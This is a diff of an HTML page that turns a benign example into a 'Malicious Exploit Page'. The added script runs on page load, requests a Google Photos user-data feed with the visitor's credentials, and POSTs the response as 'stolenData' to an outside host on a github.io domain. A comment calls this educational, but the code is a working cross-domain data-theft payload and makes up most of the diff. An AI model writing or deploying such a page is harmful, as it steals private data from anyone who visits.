@@ -1,17 +1,39 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Example Webpage</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Exploit Page</title>
+    <script>
+        // Function to simulate a request to the vulnerable domain
+        function exploitCrossDomain() {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', 'https://photos.fife.usercontent.google.com/data/feed/api/user/default', true);
+            xhr.onload = function() {
+                // Assume the response contains sensitive data
+                console.log("Response from vulnerable domain:", xhr.responseText);
+                
+                // Here you could send the data to your server (for educational purposes)
+                var dataToSteal = xhr.responseText;
+                var stealXhr = new XMLHttpRequest();
+                stealXhr.open('POST', 'https://perigou.github.io/domain-xml/steal_data', true);
+                stealXhr.setRequestHeader('Content-Type', 'application/json');
+                stealXhr.send(JSON.stringify({ stolenData: dataToSteal }));
+            };
+            xhr.onerror = function() {
+                console.error("Request failed.");
+            };
+            xhr.send();
+        }
+
+        // Automatically trigger the exploit when the page loads
+        window.onload = function() {
+            exploitCrossDomain();
+        };
+    </script>
 </head>
 <body>
-    <h1>Welcome to my example webpage!</h1>
-    <script>
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'https://photos.fife.usercontent.google.com/crossdomain.xml', true);
-        xhr.onload = function() {
-            console.log(xhr.responseText);
-        };
-        xhr.send();
-    </script>
+    <h1>Welcome to the Exploit Page</h1>
+    <p>This page attempts to exploit a cross-domain vulnerability.</p>
 </body>
 </html>
